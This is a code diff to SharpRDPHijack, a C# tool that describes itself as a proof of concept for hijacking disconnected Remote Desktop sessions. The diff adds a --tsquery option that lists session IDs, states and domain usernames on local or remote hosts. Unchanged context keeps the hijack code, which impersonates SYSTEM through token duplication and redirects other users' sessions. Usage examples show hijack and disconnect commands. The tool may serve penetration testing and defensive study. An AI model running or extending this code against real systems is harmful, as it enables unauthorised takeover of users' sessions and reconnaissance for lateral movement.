@@ -19,9 +19,12 @@ namespace SharpRDPHijack
                 string password = "";
                 bool console = false;
                 bool disconnect = false;
+                string tsquery = "";
 
                 foreach (string arg in args)
                 {
+                    if (arg.StartsWith("--tsquery="))
+                        tsquery = arg.Split(new string[] { "--tsquery=" }, StringSplitOptions.None)[1];
                     if (arg.StartsWith("--session="))
                         session = Int32.Parse(arg.Split(new string[] { "--session=" }, StringSplitOptions.None)[1]);
                     if (arg.StartsWith("--password="))
@@ -36,6 +39,19 @@ namespace SharpRDPHijack
                 if (args.Length < 1)
                     Usage();
 
+                // ------ RDP / TS Session Query...
+                if (tsquery.Length > 0)
+                {
+                    if (args.Length > 1)
+                        Console.WriteLine("\n[-] For RDP session query, only use the '--tsquery' switch\n");
+                    else
+                    {
+                        GetTSSessions(tsquery);
+                    }
+                    Environment.Exit(0);
+                }
+
+                // ------ RDP Session Hijack...
                 //Session is mandatory - if not selected, display usage
                 if (session < 0)
                     Usage();
@@ -43,7 +59,7 @@ namespace SharpRDPHijack
                 //Check if elevated admin
                 if (!IsElevatedAdmin())
                 {
-                    Console.WriteLine("\n[-] This program must be run in elevated administrator context\n");
+                    Console.WriteLine("\n[-] For RDP hijack, this program must be run in elevated administrator context\n");
                     Environment.Exit(0);
                 }
 
@@ -93,9 +109,11 @@ namespace SharpRDPHijack
         {
             Console.WriteLine("----------------\nSharp RDP Hijack\n----------------\n");
             Console.WriteLine("[*] A proof-of-concept Remote Desktop (RDP) session hijack utility for disconnected sessions");
-            Console.WriteLine("    - This utility must be run in an elevated context to connect to another session");
-            Console.WriteLine("    - If a password is not specified, NT AUTHORITY\\SYSTEM is impersonated\n");
+            Console.WriteLine("    - For session hijacking, this utility must be run in an elevated context to connect to another session");
+            Console.WriteLine("      If a password is not specified, NT AUTHORITY\\SYSTEM is impersonated\n");
+            Console.WriteLine("    - For session query, admin privileges may vary depending on target machine\n");
             Console.WriteLine("[*] Parameters: ");
+            Console.WriteLine("    --tsquery=<host> : Query a host to identify RDP/TS session information (not required for other switches)");
             Console.WriteLine("    --session=<ID> : Target session identifier");
             Console.WriteLine("    --password=<User's Password> : Session password if known (otherwise optional - not required for disconnect switch)");
             Console.WriteLine("    --console : Redirect session to console session instead of current (active) session");
@@ -108,8 +126,13 @@ namespace SharpRDPHijack
             Console.WriteLine("    SharpRDPHijack.exe --session=4 --password=P@ssw0rd\n");
             Console.WriteLine("[*] Example Usage 4: Disconnect active session #3");
             Console.WriteLine("    SharpRDPHijack.exe --session=3 --disconnect\n");
+            Console.WriteLine("[*] Example Usage 5: Query the local host for RDP/TS session information");
+            Console.WriteLine("    SharpRDPHijack.exe --tsquery=localhost\n");
             Environment.Exit(0); //not very graceful...
         }
+
+        // --------------------------------------------------------------------------
+        // RDP / TS Session Hijack Functions
 
         //Slightly modified code from James Forshaw's COM Session Moniker EoP Exploit + several P-Invoke definitions [https://www.exploit-db.com/exploits/41607]
         static int GetActiveSession()
@@ -202,6 +225,103 @@ namespace SharpRDPHijack
                 return false;
             }
         }
+
+        // --------------------------------------------------------------------------
+        // RDP / TS Session Query Functions
+
+        public static void GetTSSessions(string serverName)
+        {
+            IntPtr serverHandle = IntPtr.Zero;
+            List<string> resultList = new List<string>();
+            serverHandle = Win32.WTSOpenServer(serverName);
+
+            try
+            {
+                IntPtr pSessions = IntPtr.Zero;
+                IntPtr userPtr = IntPtr.Zero;
+                IntPtr domainPtr = IntPtr.Zero;
+                Int32 dwSessionCount = 0;
+                bool retVal = Win32.WTSEnumerateSessions(serverHandle, 0, 1, out pSessions, out dwSessionCount);
+                Int32 dataSize = Marshal.SizeOf(typeof(Win32.WTS_SESSION_INFO));
+                IntPtr currentSession = pSessions;
+
+                //if (retVal != 0)
+                if (retVal)
+                {
+                    for (int i = 0; i < dwSessionCount; i++)
+                    {
+                        Win32.WTS_SESSION_INFO si = (Win32.WTS_SESSION_INFO)Marshal.PtrToStructure((System.IntPtr)currentSession, typeof(Win32.WTS_SESSION_INFO));
+                        currentSession += dataSize;
+
+                        //Session Id
+                        Console.WriteLine("\nSession ID: " + si.SessionId.ToString());
+
+                        //Session State
+                        string state = "Unknown";
+                        if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSActive)
+                            state = "Active";
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSConnected)
+                            state = "Connecting";
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSConnectQuery)
+                            state = "ConnectQuery";
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSDisconnected)
+                            state = "Disconnected";
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSDown)
+                            state = "Down due to error";
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSIdle)
+                            state = "Idle and waiting for connection";
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSInit)
+                            state = "initializing";
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSListen)
+                            state = "Listening for a connection";
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSReset)
+                            state = "Resetting a connection";
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSShadow)
+                            state = "Shadowing";
+                        Console.WriteLine("Session State: " + state);
+
+                        //Session User
+                        string username = "";
+                        username = GetUsernameBySessionId(serverHandle, si.SessionId);
+                        Console.WriteLine("Identity: " + username);
+
+                        Win32.WTSFreeMemory(userPtr);
+                        Win32.WTSFreeMemory(domainPtr);
+                    }
+
+                    Win32.WTSFreeMemory(pSessions);
+                }
+                Console.WriteLine("");
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("\n [-] Error: " + e.Message + "\n");
+            }
+            finally
+            {
+                Win32.WTSCloseServer(serverHandle);
+            }
+        }
+
+        //https://www.pinvoke.net/default.aspx/wtsapi32.wtsquerysessioninformation
+        static string GetUsernameBySessionId(IntPtr serverHandle, int sessionId)
+        {
+            IntPtr buffer;
+            uint strLen;
+            var username = "";
+            if (Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSUserName, out buffer, out strLen) && strLen > 1)
+            {
+                username = Marshal.PtrToStringAnsi(buffer); // don't need length as these are null terminated strings
+                Win32.WTSFreeMemory(buffer);
+                if (Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSDomainName, out buffer, out strLen) && strLen > 1)
+                {
+                    username = Marshal.PtrToStringAnsi(buffer) + "\\" + username; // prepend domain name
+                    Win32.WTSFreeMemory(buffer);
+                }
+            }
+            return username;
+        }
+
     }
     class Win32
     {
@@ -220,6 +340,27 @@ namespace SharpRDPHijack
             WTSInit,                // WinStation in initialization
         }
 
+        public enum WTS_INFO_CLASS
+        {
+            WTSInitialProgram,
+            WTSApplicationName,
+            WTSWorkingDirectory,
+            WTSOEMId,
+            WTSSessionId,
+            WTSUserName,
+            WTSWinStationName,
+            WTSDomainName,
+            WTSConnectState,
+            WTSClientBuildNumber,
+            WTSClientName,
+            WTSClientDirectory,
+            WTSClientProductId,
+            WTSClientHardwareId,
+            WTSClientAddress,
+            WTSClientDisplay,
+            WTSClientProtocolType
+        }
+
         [StructLayout(LayoutKind.Sequential)]
         public struct WTS_SESSION_INFO
         {
@@ -229,32 +370,28 @@ namespace SharpRDPHijack
         }
 
         [DllImport("wtsapi32.dll", SetLastError = true)]
-        public static extern bool WTSEnumerateSessions(
-                IntPtr hServer,
-                int Reserved,
-                int Version,
-                out IntPtr ppSessionInfo,
-                out int pCount);
-
+        public static extern bool WTSEnumerateSessions(IntPtr hServer, int Reserved, int Version, out IntPtr ppSessionInfo, out int pCount);
 
         [DllImport("wtsapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern int WTSConnectSession(
-                int targetSessionId,
-                int sourceSessionId,
-                string password,
-                bool wait);
+        public static extern int WTSConnectSession(int targetSessionId, int sourceSessionId, string password, bool wait);
 
         [DllImport("wtsapi32.dll", SetLastError = true)]
-        public static extern int WTSDisconnectSession(
-            IntPtr hServer, 
-            int sessionId, 
-            bool bWait);
+        public static extern int WTSDisconnectSession(IntPtr hServer, int sessionId, bool bWait);
 
         [DllImport("kernel32.dll")]
         public static extern int WTSGetActiveConsoleSessionId();
 
         [DllImport("wtsapi32.dll", SetLastError = true)]
         public static extern void WTSFreeMemory(IntPtr memory);
+
+        [DllImport("wtsapi32.dll")]
+        public static extern IntPtr WTSOpenServer([MarshalAs(UnmanagedType.LPStr)] string pServerName);
+
+        [DllImport("wtsapi32.dll")]
+        public static extern void WTSCloseServer(IntPtr hServer);
+
+        [DllImport("wtsapi32.dll")]
+        public static extern bool WTSQuerySessionInformation(IntPtr hServer, int sessionId, WTS_INFO_CLASS wtsInfoClass, out IntPtr ppBuffer, out uint pBytesReturned);
 
 
         // ---------------------------------------- Token Duplication P-Invoke Definitions [https://gallery.technet.microsoft.com/scriptcenter/Enable-TSDuplicateToken-6f485980 and Goude 2012, TreuSec (http://www.truesec.com )]
@@ -308,42 +445,23 @@ namespace SharpRDPHijack
         }
 
         [DllImport("advapi32.dll", SetLastError = true)]
-        public extern static bool DuplicateToken(
-            IntPtr ExistingTokenHandle, int
-            SECURITY_IMPERSONATION_LEVEL,
-            out IntPtr DuplicateTokenHandle);
-
+        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool SetThreadToken(
-                IntPtr PHThread,
-                IntPtr Token
-        );
+        public static extern bool SetThreadToken(IntPtr PHThread, IntPtr Token);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool OpenProcessToken(
-                IntPtr ProcessHandle,
-                UInt32 DesiredAccess,
-                out IntPtr TokenHandle);
+        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
 
         [DllImport("advapi32.dll", SetLastError = true)]
-        public static extern bool LookupPrivilegeValue(
-                string host,
-                string name,
-                ref long pluid);
+        public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
 
         [DllImport("kernel32.dll", ExactSpelling = true)]
         public static extern IntPtr GetCurrentProcess();
 
         [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
-        public static extern bool AdjustTokenPrivileges(
-                IntPtr htok,
-                bool disall,
-                ref TokPriv1Luid newst,
-                int len,
-                IntPtr prev,
-                IntPtr relen);
+        public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
     }
 }
